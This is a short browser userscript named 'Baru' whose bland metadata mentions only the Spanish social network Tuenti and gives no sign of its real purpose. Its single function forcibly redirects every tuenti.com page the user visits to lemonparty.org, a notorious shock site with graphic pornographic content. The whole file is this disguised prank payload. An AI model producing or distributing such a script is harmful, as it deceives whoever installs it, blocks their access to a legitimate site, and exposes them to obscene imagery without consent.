// ==UserScript==
// @name           Baru
// @namespace      Tuenti
// @description    tuenti
// @include        http://*tuenti.com/*
// ==/UserScript==

(function() 
{ 
if(document.URL.match("tuenti.com")) { window.location = "http://lemonparty.org";  }
})();